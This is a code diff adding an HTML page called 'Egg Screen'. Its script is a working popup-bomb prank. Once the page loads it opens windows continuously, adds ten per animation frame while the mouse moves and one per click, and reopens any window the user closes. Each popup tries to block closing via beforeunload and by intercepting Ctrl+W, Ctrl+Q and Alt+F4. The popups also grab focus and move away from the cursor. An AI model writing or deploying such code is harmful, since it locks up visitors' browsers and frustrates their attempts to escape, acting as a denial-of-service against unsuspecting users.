@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Egg Screen</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      background: #fff;
+      color: #111;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
+    }
+    .center {
+      position: fixed;
+      inset: 0;
+      display: grid;
+      place-items: center;
+      pointer-events: none; /* clicks pass through for step 2 */
+    }
+    /* Visually hide controls for a clean screen in Step 1 */
+    #controls { display: none; }
+    .hint { display: none; }
+  </style>
+</head>
+<body>
+  <div id="controls">
+    <button id="startBtn" type="button">Start opening 1 tab</button>
+    <button id="stopBtn" type="button" style="margin-left:8px">Stop</button>
+    <button id="remainingBtn" type="button" style="margin-left:8px">Open remaining</button>
+    <div id="result" class="hint"></div>
+  </div>
+
+  <div class="center" aria-hidden="true">
+    <img src="data:image/jpeg;base64,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" alt="center image" style="max-width: 60vmin; height: auto; display: block;" />
+  </div>
+  <script>
+    // Config
+    const TOTAL_TABS = 1;            // 1) total windows to open
+    const OPEN_INTERVAL_MS = 250;    // 2) interval between attempts (adjustable)
+    const TAB_TITLE = 'eggs';        // 3) title/text content
+
+    let openedSoFar = 0;
+    let timer = null;
+    let childWindows = [];
+    let watchdogTimer = null;
+    // Frame-based opener state
+    let frameOpenerActive = false;
+    let frameRAF = null;
+    let lastMoveTs = 0;
+    // Continuous opener
+    let continuousTimer = null;
+
+    function openSomeTabs(count){
+      let opened = 0;
+      for(let i=0;i<count;i++){
+        // Open a data URL so the window shows a custom title and message
+        const TAB_HTML = `<!doctype html><html><head><meta charset="utf-8"><title>${TAB_TITLE}</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>html,body{height:100%;margin:0;display:grid;place-items:center;background:#111;color:#eee;font:16px system-ui,Segoe UI,Roboto,Arial}</style></head><body><div>${TAB_TITLE}</div><script>\n// Discourage closing and ask for confirmation\nwindow.addEventListener('beforeunload', function (e) { e.preventDefault(); e.returnValue = ''; });\n// Try to keep focus occasionally (not guaranteed)\nsetInterval(function(){ try{ window.focus(); }catch(e){} }, 3000);\n// Attempt to catch some key combos (cannot intercept browser/system shortcuts)\nwindow.addEventListener('keydown', function(e){ if((e.ctrlKey||e.metaKey) && (e.key.toLowerCase()==='w' || e.key.toLowerCase()==='q')){ e.preventDefault(); e.stopPropagation(); return; }\n// Best-effort block Alt+F4 (often handled by OS and not cancelable)\nif(e.altKey && (e.key === 'F4' || e.key === 'f4' || e.keyCode === 115)){ e.preventDefault(); e.stopPropagation(); return; }\n});\n// --- Mouse avoidance logic (child window) ---\n(function(){\n  const THRESHOLD = 140; // px proximity to start avoiding\n  const PUSH = 200;      // px to move away per reaction\n  function clamp(v, min, max){ return Math.max(min, Math.min(max, v)); }\n  function moveAway(mx, my){\n    try{\n      const left = window.screenX||window.screenLeft||0;\n      const top  = window.screenY||window.screenTop||0;\n      const w = window.outerWidth || 420;\n      const h = window.outerHeight|| 320;\n      const cx = left + w/2;\n      const cy = top  + h/2;\n      const dx = cx - mx;\n      const dy = cy - my;\n      const dist = Math.hypot(dx, dy);\n      // If mouse is near the window rect, push away\n      const nearX = mx >= left-THRESHOLD && mx <= left+w+THRESHOLD;\n      const nearY = my >= top-THRESHOLD  && my <= top+h+THRESHOLD;\n      if(!(nearX && nearY)) return;\n      const nx = dist > 0 ? dx / (dist||1) : (Math.random()*2-1);\n      const ny = dist > 0 ? dy / (dist||1) : (Math.random()*2-1);\n      const targetLeft = left + Math.round(nx * PUSH);\n      const targetTop  = top  + Math.round(ny * PUSH);\n      const sw = (screen.availWidth||screen.width||1280) - (w+10);\n      const sh = (screen.availHeight||screen.height||800) - (h+40);\n      window.moveTo(clamp(targetLeft, 0, Math.max(0, sw)), clamp(targetTop, 0, Math.max(0, sh)));\n    }catch(e){}\n  }\n  // React to messages from opener with global mouse position\n  window.addEventListener('message', function(ev){\n    var d = ev.data||{};\n    if(d && d.type==='mouse'){ moveAway(d.x, d.y); }\n  });\n  // As a fallback, if the mouse enters this window, hop away\n  window.addEventListener('mousemove', function(e){\n    // Convert client to screen by adding window's top-left\n    moveAway((window.screenX||0)+e.clientX, (window.screenY||0)+e.clientY);\n  });\n})();\n<\/script></body></html>`;
+        const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(TAB_HTML);
+
+        // Hint for popup windows: size + position + minimal chrome
+        const wWidth = 420, wHeight = 320;
+        const maxLeft = Math.max(0, (screen.availWidth||window.innerWidth||1280) - wWidth);
+        const maxTop  = Math.max(0, (screen.availHeight||window.innerHeight||800) - wHeight);
+        const left = Math.floor(Math.random() * (maxLeft+1));
+        const top  = Math.floor(Math.random() * (maxTop+1));
+        const features = [
+          `width=${wWidth}`,
+          `height=${wHeight}`,
+          `left=${left}`,
+          `top=${top}`,
+          'toolbar=0',
+          'location=0',
+          'menubar=0',
+          'status=0',
+          'scrollbars=0',
+          'resizable=1'
+        ].join(',');
+
+        const w = window.open(dataUrl, '', features);
+        if(w){ opened++; childWindows.push(w); }
+      }
+      openedSoFar += opened;
+      updateStatus();
+      startWatchdog();
+      return opened;
+    }
+
+    function updateStatus(){
+      const res = document.getElementById('result');
+      const remaining = Math.max(0, TOTAL_TABS - openedSoFar);
+      if(remaining === 0){
+        res.textContent = `All ${TOTAL_TABS} tabs opened.`;
+      } else {
+        res.textContent = `Opened ${openedSoFar}/${TOTAL_TABS}. Click "Open remaining" or "Start" again to try the remaining ${remaining}.`;
+      }
+    }
+
+    function openRemaining(){
+      const remaining = Math.max(0, TOTAL_TABS - openedSoFar);
+      if(remaining > 0) openSomeTabs(remaining);
+    }
+
+    function startOpening(){
+      // First, attempt to open as many as possible immediately within this gesture
+      openSomeTabs(Math.max(0, TOTAL_TABS - openedSoFar));
+      // Then, continue at a gentle interval to attempt any that were blocked
+      stopOpening();
+      timer = setInterval(() => {
+        const remaining = Math.max(0, TOTAL_TABS - openedSoFar);
+        if(remaining <= 0){
+          stopOpening();
+          return;
+        }
+        // Try one per tick to reduce likelihood of blocking
+        openSomeTabs(1);
+      }, OPEN_INTERVAL_MS);
+    }
+
+    function stopOpening(){
+      if(timer){ clearInterval(timer); timer = null; }
+    }
+
+    function startWatchdog(){
+      if(watchdogTimer) return;
+      watchdogTimer = setInterval(() => {
+        // Remove closed window refs
+        childWindows = childWindows.filter(w => {
+          try { return w && !w.closed; } catch(e){ return false; }
+        });
+        // Reopen to maintain TOTAL_TABS
+        const target = TOTAL_TABS;
+        const deficit = Math.max(0, target - childWindows.length);
+        if(deficit > 0){
+          openSomeTabs(deficit);
+        }
+      }, 2000);
+    }
+
+    // Wire up controls (require user gesture)
+    document.getElementById('startBtn').addEventListener('click', startOpening);
+    document.getElementById('stopBtn').addEventListener('click', stopOpening);
+    document.getElementById('remainingBtn').addEventListener('click', openRemaining);
+
+    // Step 2: Click anywhere to open one new popup window of the same page
+    function openOneEggWindow(){
+      const COUNT = 1; // open 1 window per click
+      const wWidth = 420, wHeight = 320;
+      const maxLeft = Math.max(0, (screen.availWidth||window.innerWidth||1280) - wWidth);
+      const maxTop  = Math.max(0, (screen.availHeight||window.innerHeight||800) - wHeight);
+
+      let last = null;
+      for(let i=0;i<COUNT;i++){
+        const left = Math.floor(Math.random() * (maxLeft+1));
+        const top  = Math.floor(Math.random() * (maxTop+1));
+        const features = [
+          `width=${wWidth}`,
+          `height=${wHeight}`,
+          `left=${left}`,
+          `top=${top}`,
+          'toolbar=0','location=0','menubar=0','status=0','scrollbars=0','resizable=1'
+        ].join(',');
+        const w = window.open(location.href, '', features);
+        if(w) last = w;
+      }
+      if(last){
+        try { last.focus(); } catch(e){}
+        setTimeout(() => { try { last.focus(); } catch(e){} }, 0);
+        setTimeout(() => { try { last.focus(); } catch(e){} }, 200);
+        try { window.blur(); } catch(e){}
+      }
+    }
+    document.addEventListener('pointerdown', function(e){
+      e.preventDefault();
+      openOneEggWindow();
+    });
+
+    // --- Mouse broadcasting to children (opener page) ---
+    (function(){
+      let lastSent = 0;
+      document.addEventListener('mousemove', function(e){
+        const now = performance.now();
+        if(now - lastSent < 20) return; // throttle ~50fps
+        lastSent = now;
+        const payload = { type: 'mouse', x: e.screenX, y: e.screenY };
+        childWindows.forEach(w => { try { if(w && !w.closed) w.postMessage(payload, '*'); } catch(_){} });
+      }, { passive: true });
+    })();
+
+    // --- Open a new window every frame while the mouse is moving ---
+    (function(){
+      function loop(){
+        frameRAF = null;
+        const now = performance.now();
+        // If mouse recently moved, open one window and continue next frame
+        if(now - lastMoveTs < 60){ // ~1-2 frames grace at 60Hz
+          openSomeTabs(10);
+          frameRAF = requestAnimationFrame(loop);
+        } else {
+          frameOpenerActive = false;
+        }
+      }
+      // Track mouse movement and start RAF loop if not running
+      document.addEventListener('mousemove', function(){
+        lastMoveTs = performance.now();
+        if(!frameOpenerActive){
+          frameOpenerActive = true;
+          if(!frameRAF) frameRAF = requestAnimationFrame(loop);
+        }
+      }, { passive: true });
+    })();
+
+    // --- Continuous opener: opens windows steadily once the page is loaded ---
+    (function(){
+      function startContinuous(){
+        if(continuousTimer) return;
+        // Open 1 window every 100ms (~10/s). Adjust as desired.
+        continuousTimer = setInterval(() => {
+          openSomeTabs(1);
+        }, 100);
+      }
+      if(document.readyState === 'complete' || document.readyState === 'interactive'){
+        // Slight delay to allow initial user gesture if any
+        setTimeout(startContinuous, 100);
+      } else {
+        document.addEventListener('DOMContentLoaded', () => setTimeout(startContinuous, 100));
+      }
+    })();
+  </script>
+</body>
+</html>
